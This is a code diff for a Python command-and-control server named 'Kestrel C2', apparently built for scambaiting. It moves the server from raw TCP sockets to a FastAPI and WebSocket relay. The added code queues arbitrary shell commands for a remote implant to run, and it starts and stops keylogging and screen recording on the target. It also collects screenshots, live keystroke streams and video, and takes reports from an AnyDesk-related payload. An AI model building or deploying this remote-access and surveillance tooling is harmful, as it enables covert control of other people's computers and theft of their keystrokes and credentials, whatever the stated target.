@@ -1,29 +1,29 @@
 #!/usr/bin/env python3
 """
-TCP Command Sender (Enhanced - Triple Purpose C2)
-This program listens for incoming connections and sends commands to execute.
-Now also receives HTTP reports from anytime payload and AnyDesk events from blackhole.
+C2 Server (Middleman)
+Relays commands and streams between home.py (operator) and receiver.py (target).
+Receives HTTP reports from anytime payload and AnyDesk events from blackhole.
 """
 
 import os
-import socket
 import sys
 import json
 import threading
 import time
+import uuid
+import asyncio
 from datetime import datetime
-from typing import Optional, Dict, Any
-from tqdm import tqdm
+from typing import Optional, Dict, Any, List
+from collections import defaultdict
 
 # FastAPI imports
-from fastapi import FastAPI, Request, HTTPException, Depends
+from fastapi import FastAPI, Request, HTTPException, Depends, WebSocket, WebSocketDisconnect, UploadFile, File, Form
 from fastapi.security import APIKeyHeader
 from pydantic import BaseModel
 import uvicorn
 
 # Import from utils modules
-from utils.config import DEFAULT_HOST, DEFAULT_PORT, BUFFER_SIZE, BINARY_START_MARKER, C2_API_KEY, FASTAPI_PORT
-from utils.protocol import receive_text, receive_binary, peek_for_binary
+from utils.config import C2_API_KEY, FASTAPI_PORT
 
 
 # Ensure data directories exist
@@ -42,22 +42,40 @@ for dir_path in DATA_DIRS:
 
 
 # ============================================================================
-# CONSTANTS
+# DATA STRUCTURES
 # ============================================================================
 
-# Timing delays (seconds)
-FASTAPI_STARTUP_DELAY = 1  # Time to wait for FastAPI to initialize before starting TCP server
+# Work queue: {receiver_id: [work_items]}
+work_queue: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
+
+# Work results: {work_id: result}
+work_results: Dict[str, Dict[str, Any]] = {}
+
+# Active receivers: {receiver_id: last_seen_timestamp}
+active_receivers: Dict[str, float] = {}
+
+# WebSocket connections: {receiver_id: {"home": ws, "receiver": ws}}
+websocket_connections: Dict[str, Dict[str, WebSocket]] = {}
+
+# Streaming files: {receiver_id: {"keylogger": file_handle, "recording": writer}}
+streaming_files: Dict[str, Dict[str, Any]] = {}
+
+# Lock for thread-safe operations
+queue_lock = threading.Lock()
 
 
 # ============================================================================
 # FASTAPI APPLICATION
 # ============================================================================
 
-# Create FastAPI app
+# Create FastAPI app (docs disabled for security)
 app = FastAPI(
     title="Kestrel C2 Server",
     description="Command & Control server for scambaiting operations",
     version="2.0.0",
+    docs_url=None,
+    redoc_url=None,
+    openapi_url=None,
 )
 
 # API Key security
@@ -99,6 +117,32 @@ class AnytimeReport(BaseModel):
 
 
 # ============================================================================
+# PYDANTIC MODELS FOR C2 OPERATIONS
+# ============================================================================
+
+
+class CommandRequest(BaseModel):
+    """Model for command execution request"""
+    command: Optional[str] = None
+    action: Optional[str] = None  # For actions like "screenshot"
+
+
+class WorkPollRequest(BaseModel):
+    """Model for work polling request"""
+    receiver_id: str
+    last_check: Optional[float] = None  # Timestamp of last poll
+
+
+class WorkResultRequest(BaseModel):
+    """Model for work result posting"""
+    work_id: str
+    receiver_id: str
+    status: str  # "completed" or "failed"
+    result: Optional[str] = None
+    error: Optional[str] = None
+
+
+# ============================================================================
 # FASTAPI ROUTES
 # ============================================================================
 
@@ -115,6 +159,283 @@ async def anytime_report(report: AnytimeReport, request: Request, api_key: str =
     """Receive AnyDesk access reports from Anytime payload"""
     log_anytime_report(report.dict(), request.client.host)
     return {"status": "ok"}
+
+
+# ============================================================================
+# HTTP ENDPOINTS FOR OPERATOR (home.py)
+# ============================================================================
+
+
+@app.post("/receiver/{receiver_id}/command")
+async def execute_command(
+    receiver_id: str,
+    request: CommandRequest,
+    api_key: str = Depends(get_api_key)
+):
+    """Execute a command or action on a receiver"""
+    work_id = str(uuid.uuid4())
+    
+    # Determine work type
+    if request.command:
+        work_type = "command"
+        params = {"command": request.command}
+    elif request.action:
+        work_type = request.action
+        params = {}
+    else:
+        raise HTTPException(status_code=400, detail="Either 'command' or 'action' must be provided")
+    
+    # Create work item
+    work_item = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "work_type": work_type,
+        "params": params,
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    # Queue work
+    with queue_lock:
+        work_queue[receiver_id].append(work_item)
+    
+    print(f"[Queued work {work_id} for {receiver_id}]: {work_type}")
+    return {"status": "ok", "work_id": work_id}
+
+
+@app.get("/receiver/{receiver_id}/result/{work_id}")
+async def get_result(
+    receiver_id: str,
+    work_id: str,
+    api_key: str = Depends(get_api_key)
+):
+    """Get result of a work item"""
+    with queue_lock:
+        result = work_results.get(work_id)
+    
+    if not result:
+        return {"status": "pending"}
+    
+    return result
+
+
+@app.get("/receivers")
+async def list_receivers(api_key: str = Depends(get_api_key)):
+    """List all active receivers"""
+    current_time = time.time()
+    with queue_lock:
+        active = {
+            rid: {
+                "last_seen": last_seen,
+                "pending_work": len(work_queue.get(rid, [])),
+                "has_control_ws": "home" in websocket_connections.get(rid, {}),
+            }
+            for rid, last_seen in active_receivers.items()
+            if current_time - last_seen < 300  # Active if seen in last 5 minutes
+        }
+    
+    return {
+        "receivers": list(active.keys()),
+        "details": active,
+        "count": len(active)
+    }
+
+
+@app.post("/receiver/{receiver_id}/keylogger/start")
+async def start_keylogger(
+    receiver_id: str,
+    api_key: str = Depends(get_api_key)
+):
+    """Start keylogger on receiver"""
+    work_id = str(uuid.uuid4())
+    work_item = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "work_type": "keylogger_start",
+        "params": {},
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    with queue_lock:
+        work_queue[receiver_id].append(work_item)
+    
+    return {"status": "ok", "work_id": work_id}
+
+
+@app.post("/receiver/{receiver_id}/keylogger/stop")
+async def stop_keylogger(
+    receiver_id: str,
+    api_key: str = Depends(get_api_key)
+):
+    """Stop keylogger on receiver"""
+    work_id = str(uuid.uuid4())
+    work_item = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "work_type": "keylogger_stop",
+        "params": {},
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    with queue_lock:
+        work_queue[receiver_id].append(work_item)
+    
+    return {"status": "ok", "work_id": work_id}
+
+
+@app.post("/receiver/{receiver_id}/recording/start")
+async def start_recording(
+    receiver_id: str,
+    api_key: str = Depends(get_api_key)
+):
+    """Start screen recording on receiver"""
+    work_id = str(uuid.uuid4())
+    work_item = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "work_type": "recording_start",
+        "params": {},
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    with queue_lock:
+        work_queue[receiver_id].append(work_item)
+    
+    return {"status": "ok", "work_id": work_id}
+
+
+@app.post("/receiver/{receiver_id}/recording/stop")
+async def stop_recording(
+    receiver_id: str,
+    api_key: str = Depends(get_api_key)
+):
+    """Stop screen recording on receiver"""
+    work_id = str(uuid.uuid4())
+    work_item = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "work_type": "recording_stop",
+        "params": {},
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    with queue_lock:
+        work_queue[receiver_id].append(work_item)
+    
+    return {"status": "ok", "work_id": work_id}
+
+
+# ============================================================================
+# HTTP ENDPOINTS FOR RECEIVER (Internal)
+# ============================================================================
+
+
+@app.post("/internal/work/poll")
+async def poll_work(
+    request: WorkPollRequest,
+    api_key: str = Depends(get_api_key)
+):
+    """Poll for pending work items (receiver.py calls this)"""
+    receiver_id = request.receiver_id
+    
+    # Update last seen
+    active_receivers[receiver_id] = time.time()
+    
+    # Get all pending work since last check
+    with queue_lock:
+        if receiver_id not in work_queue:
+            return {"work_items": []}
+        
+        if request.last_check:
+            # Return only work created after last_check
+            pending = [
+                item for item in work_queue[receiver_id]
+                if item.get("created_at", 0) > request.last_check
+            ]
+        else:
+            # Return all pending work
+            pending = [item for item in work_queue[receiver_id] if item.get("status") == "pending"]
+    
+    return {"work_items": pending}
+
+
+@app.post("/internal/work/result")
+async def post_work_result(
+    result: WorkResultRequest,
+    api_key: str = Depends(get_api_key)
+):
+    """Post work result (receiver.py calls this)"""
+    with queue_lock:
+        # Update work item status
+        if result.receiver_id in work_queue:
+            for item in work_queue[result.receiver_id]:
+                if item["work_id"] == result.work_id:
+                    item["status"] = result.status
+                    item["completed_at"] = time.time()
+                    break
+        
+        # Store result
+        work_results[result.work_id] = {
+            "work_id": result.work_id,
+            "receiver_id": result.receiver_id,
+            "status": result.status,
+            "result": result.result,
+            "error": result.error,
+            "completed_at": time.time()
+        }
+    
+    print(f"[Work {result.work_id} completed]: {result.status}")
+    return {"status": "ok"}
+
+
+@app.post("/internal/work/result/binary")
+async def post_work_result_binary(
+    receiver_id: str = Form(...),
+    work_id: str = Form(...),
+    data_type: str = Form(...),
+    file: UploadFile = File(...),
+    api_key: str = Depends(get_api_key)
+):
+    """Post binary work result (screenshot, snapshot, etc.)"""
+    # Determine file path
+    if data_type.startswith("ss_") or data_type.startswith("screenshot_"):
+        filepath = f"data/screenshots/{data_type}"
+    elif data_type.startswith("snap_") or data_type.startswith("snapshot_"):
+        filepath = f"data/snapshots/{data_type}"
+    else:
+        filepath = f"data/{data_type}"
+    
+    # Save file
+    content = await file.read()
+    with open(filepath, "wb") as f:
+        f.write(content)
+    
+    # Store result
+    with queue_lock:
+        if receiver_id in work_queue:
+            for item in work_queue[receiver_id]:
+                if item["work_id"] == work_id:
+                    item["status"] = "completed"
+                    item["completed_at"] = time.time()
+                    break
+        
+        work_results[work_id] = {
+            "work_id": work_id,
+            "receiver_id": receiver_id,
+            "status": "completed",
+            "result_type": "binary",
+            "data_type": data_type,
+            "filepath": filepath,
+            "size": len(content),
+            "completed_at": time.time()
+        }
+    
+    print(f"[Saved: {filepath} ({len(content):,} bytes)]\n")
+    return {"status": "ok", "saved": filepath}
 
 
 # ============================================================================
@@ -288,304 +609,281 @@ def log_anytime_report(data: dict, remote_addr: str):
 
 
 # ============================================================================
-# TCP COMMAND HANDLER
+# WEBSOCKET ENDPOINTS (Operator - home.py)
 # ============================================================================
 
 
-def handle_keylog_stream(client_socket):
-    """
-    Handle keylogger streaming mode.
-    Receives keystrokes in real-time and writes to file.
-    Non-blocking: Press Enter to send /stop command.
-    """
-    # Receive start marker with timestamp
-    data = receive_text(client_socket)
-    if not data.startswith("<KEYLOG_START>"):
-        print(f"[Unexpected keylog response: {data}]")
-        return
+@app.websocket("/control/{receiver_id}")
+async def control_websocket(websocket: WebSocket, receiver_id: str):
+    """Control WebSocket for operator (home.py) - relays to receiver"""
+    await websocket.accept()
+    
+    with queue_lock:
+        if receiver_id not in websocket_connections:
+            websocket_connections[receiver_id] = {}
+        websocket_connections[receiver_id]["home"] = websocket
+    
+    print(f"[Control WS] home.py connected for {receiver_id}")
+    
+    try:
+        while True:
+            # Receive message from home.py
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            
+            # Relay to receiver if connected
+            receiver_ws = websocket_connections.get(receiver_id, {}).get("receiver")
+            if receiver_ws:
+                await receiver_ws.send_text(json.dumps(message))
+            else:
+                # Receiver not connected, send error back
+                await websocket.send_text(json.dumps({
+                    "type": "error",
+                    "message": "Receiver not connected"
+                }))
+    except WebSocketDisconnect:
+        print(f"[Control WS] home.py disconnected for {receiver_id}")
+    finally:
+        with queue_lock:
+            if receiver_id in websocket_connections:
+                websocket_connections[receiver_id].pop("home", None)
 
-    timestamp = data.replace("<KEYLOG_START>", "").strip()
+
+@app.websocket("/stream/keylogger/{receiver_id}")
+async def keylogger_stream_websocket(websocket: WebSocket, receiver_id: str):
+    """Keylogger stream WebSocket for operator (home.py) - relays from receiver"""
+    await websocket.accept()
+    
+    # Open file for keylog
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"data/keylogs/keylog_{timestamp}.txt"
-
-    print(f"[Keylogger started - saving to {filename}]")
-    print("[Press Enter to send /stop command]")
-    print("-" * 60)
-
-    # Flag to signal stop
-    stop_requested = threading.Event()
-
-    def input_thread():
-        """Wait for user to press Enter"""
-        try:
-            input()  # Wait for Enter
-            stop_requested.set()
-        except:
-            pass
-
-    # Start input thread
-    threading.Thread(target=input_thread, daemon=True).start()
-
-    # Open file for writing
-    with open(filename, "w", encoding="utf-8") as f:
-        buffer = b""
-
-        # Set socket timeout for non-blocking receive
-        client_socket.settimeout(0.1)
-
-        while not stop_requested.is_set():
-            try:
-                # Receive data with timeout
-                chunk = client_socket.recv(BUFFER_SIZE)
-                if not chunk:
-                    print("\n[Connection lost]")
-                    break
-
-                buffer += chunk
-
-                # Check for end marker
-                if b"<KEYLOG_END>" in buffer:
-                    # Extract any remaining keystrokes before end marker
-                    remaining = buffer.split(b"<KEYLOG_END>")[0]
-                    if remaining:
-                        text = remaining.decode("utf-8", errors="replace")
-                        sys.stdout.write(text)
-                        sys.stdout.flush()
-                        f.write(text)
-
-                    # Receive the final text response
-                    client_socket.settimeout(None)  # Reset timeout
-                    receive_text(client_socket)
-                    break
-
-                # Process available data
-                try:
-                    text = buffer.decode("utf-8", errors="replace")
-                    buffer = b""  # Clear buffer after successful decode
-
-                    # Display and save keystroke
-                    sys.stdout.write(text)
-                    sys.stdout.flush()
-                    f.write(text)
-
-                except UnicodeDecodeError:
-                    # Incomplete UTF-8 sequence, wait for more data
-                    pass
-
-            except socket.timeout:
-                # Timeout - check if stop requested
-                continue
-            except KeyboardInterrupt:
-                print("\n[Interrupted - stopping keylogger]")
-                stop_requested.set()
+    file_handle = open(filename, "w", encoding="utf-8")
+    
+    with queue_lock:
+        if receiver_id not in streaming_files:
+            streaming_files[receiver_id] = {}
+        streaming_files[receiver_id]["keylogger"] = file_handle
+    
+    print(f"[Keylogger WS] home.py connected for {receiver_id} - saving to {filename}")
+    
+    try:
+        while True:
+            # Receive stream data from receiver (via relay)
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            
+            if message.get("type") == "stream_data":
+                # Write to file and echo to console
+                text = message.get("data", "")
+                sys.stdout.write(text)
+                sys.stdout.flush()
+                file_handle.write(text)
+                file_handle.flush()
+            elif message.get("type") == "stream_end":
                 break
-
-        # Reset socket timeout
-        client_socket.settimeout(None)
-
-        # If user requested stop, send /stop command
-        if stop_requested.is_set() and not b"<KEYLOG_END>" in buffer:
-            print("\n[Sending /stop command...]")
-            client_socket.sendall(b"/stop")
-            # Wait for confirmation
-            try:
-                receive_text(client_socket)
-            except:
-                pass
-
-    print(f"\n[Keylog saved to {filename}]")
+    except WebSocketDisconnect:
+        print(f"[Keylogger WS] home.py disconnected for {receiver_id}")
+    finally:
+        file_handle.close()
+        with queue_lock:
+            if receiver_id in streaming_files:
+                streaming_files[receiver_id].pop("keylogger", None)
+        print(f"[Keylog saved to {filename}]")
 
 
-def handle_screenrecord_stream(client_socket):
-    """
-    Handle screen recording frame streaming.
-    Receives frames and builds video using cv2.VideoWriter.
-    """
+@app.websocket("/stream/recording/{receiver_id}")
+async def recording_stream_websocket(websocket: WebSocket, receiver_id: str):
+    """Recording stream WebSocket for operator (home.py) - relays from receiver"""
+    await websocket.accept()
+    
     try:
         import cv2
         import numpy as np
     except ImportError:
-        print("[ERROR: opencv-python not installed. Run: pip install opencv-python]")
-        receive_text(client_socket)  # Consume error message
+        await websocket.send_text(json.dumps({
+            "type": "error",
+            "message": "opencv-python not installed"
+        }))
+        await websocket.close()
         return
-
-    # Receive start marker with metadata
-    data = receive_text(client_socket)
-    if not data.startswith("<RECORDING_START>"):
-        print(f"[Unexpected recording response: {data}]")
+    
+    # Receive metadata
+    metadata_msg = await websocket.receive_text()
+    metadata = json.loads(metadata_msg)
+    
+    if metadata.get("type") != "stream_start":
+        await websocket.close()
         return
-
-    metadata = data.replace("<RECORDING_START>", "").strip()
-    resolution, fps, timestamp = metadata.split("|")
+    
+    resolution = metadata.get("resolution", "1920x1080")
+    fps = metadata.get("fps", 5)
     width, height = map(int, resolution.split("x"))
-    fps = int(fps)
-
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"data/screenrecordings/recording_{timestamp}.mp4"
-
-    print(f"[Screen recording started: {width}x{height} @ {fps} FPS]")
-    print(f"[Saving to {filename}]")
-    print("[Press Enter to send /stop command]")
-    print()
-
-    # Flag to signal stop
-    stop_requested = threading.Event()
-
-    def input_thread():
-        """Wait for user to press Enter"""
-        try:
-            input()  # Wait for Enter
-            stop_requested.set()
-        except:
-            pass
-
-    # Start input thread
-    threading.Thread(target=input_thread, daemon=True).start()
-
+    
     # Setup video writer
-    # Try H264 first, fallback to mp4v
-    fourcc_options = [
-        ("avc1", "H264"),
-        ("H264", "H264"),
-        ("mp4v", "MPEG-4"),
-    ]
-
-    out = None
-    for fourcc_code, codec_name in fourcc_options:
-        try:
-            fourcc = cv2.VideoWriter_fourcc(*fourcc_code)
-            out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
-            if out.isOpened():
-                print(f"[Using codec: {codec_name}]")
-                break
-            else:
-                print(f"[Codec {codec_name} ({fourcc_code}) not available, trying next...]")
-            out.release()
-            out = None
-        except Exception as e:
-            print(f"[Codec {codec_name} ({fourcc_code}) failed: {e}]")
-            continue
-
-    if out is None:
-        print("[ERROR: Could not initialize video writer]")
-        # Consume remaining frames
-        while True:
-            try:
-                if peek_for_binary(client_socket):
-                    receive_binary(client_socket)
-                else:
-                    receive_text(client_socket)
-                    break
-            except:
-                break
+    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+    writer = cv2.VideoWriter(filename, fourcc, fps, (width, height))
+    
+    if not writer.isOpened():
+        await websocket.send_text(json.dumps({
+            "type": "error",
+            "message": "Could not initialize video writer"
+        }))
+        await websocket.close()
         return
-
+    
+    with queue_lock:
+        if receiver_id not in streaming_files:
+            streaming_files[receiver_id] = {}
+        streaming_files[receiver_id]["recording"] = writer
+    
+    print(f"[Recording WS] home.py connected for {receiver_id} - saving to {filename}")
     frame_count = 0
-
+    
     try:
-        with tqdm(desc="Recording", unit="frames") as pbar:
-            while not stop_requested.is_set():
-                # Check if next data is binary (frame) or text (end marker)
-                # Timeout must be longer than frame interval (1/fps = 0.2s at 5fps)
-                # Use 0.5s to be safe
-                if peek_for_binary(client_socket, timeout=0.5):
-                    # Receive frame
-                    frame_name, frame_data = receive_binary(client_socket)
-
-                    # Decode JPEG frame
-                    nparr = np.frombuffer(frame_data, np.uint8)
-                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-
-                    if frame is not None:
-                        # Write to video
-                        out.write(frame)
-                        frame_count += 1
-                        pbar.update(1)
-                    else:
-                        print(f"\n[Warning: Failed to decode frame {frame_count}]")
-                else:
-                    # Check for end marker
-                    try:
-                        client_socket.settimeout(0.1)
-                        data = receive_text(client_socket)
-                        client_socket.settimeout(None)
-                        if "<RECORDING_END>" in data:
-                            break
-                    except socket.timeout:
-                        # No data yet, check stop flag again
-                        continue
-                    except:
-                        break
-
-            # If user requested stop, send /stop command
-            if stop_requested.is_set():
-                print("\n[Sending /stop command...]")
-                client_socket.sendall(b"/stop")
-                # Wait for confirmation
-                try:
-                    receive_text(client_socket)
-                except:
-                    pass
-
-    except KeyboardInterrupt:
-        print("\n[Interrupted - stopping recording]")
-        try:
-            client_socket.sendall(b"/stop")
-            receive_text(client_socket)
-        except:
-            pass
-    except Exception as e:
-        print(f"\n[Recording error: {e}]")
+        while True:
+            # Receive frame data
+            data = await websocket.receive_bytes()
+            
+            # Decode JPEG frame
+            nparr = np.frombuffer(data, np.uint8)
+            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+            
+            if frame is not None:
+                writer.write(frame)
+                frame_count += 1
+            else:
+                # Check if it's end marker
+                if data == b"<RECORDING_END>":
+                    break
+    except WebSocketDisconnect:
+        print(f"[Recording WS] home.py disconnected for {receiver_id}")
     finally:
-        out.release()
+        writer.release()
+        with queue_lock:
+            if receiver_id in streaming_files:
+                streaming_files[receiver_id].pop("recording", None)
+        print(f"[Recording complete: {filename}]")
+        print(f"[Total frames: {frame_count}]")
 
-    print(f"\n[Recording complete: {filename}]")
-    print(f"[Total frames: {frame_count}]")
-    print(f"[Duration: {frame_count / fps:.1f} seconds]")
+
+# ============================================================================
+# WEBSOCKET ENDPOINTS (Internal - receiver.py)
+# ============================================================================
 
 
-def handle_response(client_socket, command):
-    """
-    Handle response from receiver.
-    Auto-detects binary vs text and routes to appropriate handler.
-    """
-    # Special handling for keylogger mode
-    if command == "/keylogger":
-        handle_keylog_stream(client_socket)
+@app.websocket("/internal/control/{receiver_id}")
+async def internal_control_websocket(websocket: WebSocket, receiver_id: str):
+    """Control WebSocket for receiver (receiver.py) - relays to home.py"""
+    await websocket.accept()
+    
+    with queue_lock:
+        if receiver_id not in websocket_connections:
+            websocket_connections[receiver_id] = {}
+        websocket_connections[receiver_id]["receiver"] = websocket
+    
+    print(f"[Control WS] receiver.py connected for {receiver_id}")
+    
+    try:
+        while True:
+            # Receive message from receiver
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            
+            # Relay to home.py if connected
+            home_ws = websocket_connections.get(receiver_id, {}).get("home")
+            if home_ws:
+                await home_ws.send_text(json.dumps(message))
+    except WebSocketDisconnect:
+        print(f"[Control WS] receiver.py disconnected for {receiver_id}")
+    finally:
+        with queue_lock:
+            if receiver_id in websocket_connections:
+                websocket_connections[receiver_id].pop("receiver", None)
+
+
+@app.websocket("/internal/stream/keylogger/{receiver_id}")
+async def internal_keylogger_stream_websocket(websocket: WebSocket, receiver_id: str):
+    """Keylogger stream WebSocket for receiver (receiver.py) - relays to home.py"""
+    await websocket.accept()
+    
+    print(f"[Keylogger WS] receiver.py connected for {receiver_id}")
+    
+    # Get home.py WebSocket connection
+    home_ws = websocket_connections.get(receiver_id, {}).get("home")
+    if not home_ws:
+        await websocket.close(code=1008, reason="No home.py connection")
         return
+    
+    try:
+        while True:
+            # Receive stream data from receiver
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            
+            # Relay to home.py
+            await home_ws.send_text(json.dumps(message))
+            
+            # Also write to file if available
+            with queue_lock:
+                file_handle = streaming_files.get(receiver_id, {}).get("keylogger")
+                if file_handle and message.get("type") == "stream_data":
+                    file_handle.write(message.get("data", ""))
+                    file_handle.flush()
+    except WebSocketDisconnect:
+        print(f"[Keylogger WS] receiver.py disconnected for {receiver_id}")
 
-    # Special handling for screen recording
-    if command == "/screenrecord":
-        handle_screenrecord_stream(client_socket)
+
+@app.websocket("/internal/stream/recording/{receiver_id}")
+async def internal_recording_stream_websocket(websocket: WebSocket, receiver_id: str):
+    """Recording stream WebSocket for receiver (receiver.py) - relays to home.py"""
+    await websocket.accept()
+    
+    print(f"[Recording WS] receiver.py connected for {receiver_id}")
+    
+    # Get home.py WebSocket connection
+    home_ws = websocket_connections.get(receiver_id, {}).get("home")
+    if not home_ws:
+        await websocket.close(code=1008, reason="No home.py connection")
         return
+    
+    try:
+        # First message should be metadata
+        metadata_msg = await websocket.receive_text()
+        metadata = json.loads(metadata_msg)
+        
+        # Relay metadata to home.py
+        await home_ws.send_text(json.dumps(metadata))
+        
+        while True:
+            # Receive frame data from receiver
+            data = await websocket.receive_bytes()
+            
+            # Relay to home.py
+            await home_ws.send_bytes(data)
+            
+            # Also write to video writer if available
+            with queue_lock:
+                writer = streaming_files.get(receiver_id, {}).get("recording")
+                if writer and data != b"<RECORDING_END>":
+                    try:
+                        import cv2
+                        import numpy as np
+                        nparr = np.frombuffer(data, np.uint8)
+                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                        if frame is not None:
+                            writer.write(frame)
+                    except:
+                        pass
+    except WebSocketDisconnect:
+        print(f"[Recording WS] receiver.py disconnected for {receiver_id}")
 
-    # Check if response is binary
-    if peek_for_binary(client_socket, timeout=0.5):
-        # Receive binary data
-        data_type, binary_data = receive_binary(client_socket)
 
-        # Determine file path based on data type
-        if data_type.startswith("ss_") or data_type.startswith("screenshot_"):
-            filepath = f"data/screenshots/{data_type}"
-        elif data_type.startswith("snap_") or data_type.startswith("snapshot_"):
-            filepath = f"data/snapshots/{data_type}"
-        else:
-            # Generic binary file
-            filepath = f"data/{data_type}"
-
-        # Save binary data
-        with open(filepath, "wb") as f:
-            f.write(binary_data)
-
-        print(f"[Saved: {filepath} ({len(binary_data):,} bytes)]")
-        print()
-    else:
-        # Receive text response
-        response = receive_text(client_socket)
-
-        # Print response
-        if response:
-            print(response)
-            if not response.endswith("\n"):
-                print()
+# ============================================================================
+# SERVER STARTUP
+# ============================================================================
 
 
 def start_fastapi_server():
@@ -593,103 +891,17 @@ def start_fastapi_server():
     uvicorn.run(app, host="0.0.0.0", port=FASTAPI_PORT, log_level="error", access_log=False)
 
 
-def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
-    """
-    Start the TCP command sender server.
-
-    Args:
-        host: The host address to bind to (0.0.0.0 means all available interfaces)
-        port: The port number to listen on
-    """
-    # Create a TCP socket
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Allow reuse of address to avoid "Address already in use" errors
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-    try:
-        # Bind the socket to the host and port
-        server_socket.bind((host, port))
-
-        # Listen for incoming connections (backlog of 1)
-        server_socket.listen(1)
-
-        print(f"Listening on {host}:{port}")
-        print("Waiting for client to connect...\n")
-
-        # Main server loop - accept multiple clients sequentially
-        while True:
-            # Accept a connection
-            client_socket, client_address = server_socket.accept()
-            print(f"Connected: {client_address[0]}:{client_address[1]}")
-            print("Type /help for available commands\n")
-
-            # Continuously read user input and send commands
-            try:
-                while True:
-                    try:
-                        # Get command from user
-                        command = input("command> ")
-
-                        # Skip empty commands
-                        if not command.strip():
-                            continue
-
-                        # Send the command
-                        client_socket.sendall(command.encode("utf-8"))
-                        print()
-
-                        # Handle response
-                        handle_response(client_socket, command)
-
-                    except KeyboardInterrupt:
-                        print("\n\nExiting...")
-                        raise  # Re-raise to exit server loop
-                    except BrokenPipeError:
-                        print("\nConnection closed by receiver")
-                        break
-                    except Exception as e:
-                        print(f"\nError: {e}")
-                        break
-
-            finally:
-                # Clean up client connection
-                client_socket.close()
-                print("\nWaiting for next client to connect...\n")
-
-    except KeyboardInterrupt:
-        print("\n\nExiting...")
-    except OSError as e:
-        print(f"Socket error: {e}")
-        sys.exit(1)
-    except Exception as e:
-        print(f"Error: {e}")
-        sys.exit(1)
-    finally:
-        server_socket.close()
-
-
 if __name__ == "__main__":
-    print("\n[ Enhanced C2 Server - Triple Purpose ]\n")
-    print("Modes:")
-    print("  1. TCP Server   (port 5555) - receiver.py connections")
-    print("  2. FastAPI HTTP (port 8080) - anytime reports + AnyDesk events")
-    print()
-    print("FastAPI Features:")
+    print("\n[ C2 Server - HTTP/WebSocket Relay ]\n")
+    print("Features:")
+    print("  • HTTP API (port 8080) - Command & Control")
+    print("  • WebSocket Relay - Real-time control and streaming")
     print("  • POST /report - Anytime payload reports")
     print("  • POST /anydesk_event - Blackhole AnyDesk events")
     print("  • API Key authentication (X-API-Key header)")
-    print(f"  • Interactive docs: http://localhost:{FASTAPI_PORT}/docs")
     print()
-
-    # Start FastAPI server in background thread
-    fastapi_thread = threading.Thread(target=start_fastapi_server, daemon=True, name="FastAPI")
-    fastapi_thread.start()
     print(f"[FastAPI] Starting on port {FASTAPI_PORT}...")
-
-    # Give FastAPI time to start
-    time.sleep(FASTAPI_STARTUP_DELAY)
-
-    # Start TCP server in main thread
-    print("[ TCP Server Starting... ]\n")
-    start_tcp_sender(DEFAULT_HOST, DEFAULT_PORT)
+    print()
+    
+    # Start FastAPI server (blocking)
+    start_fastapi_server()
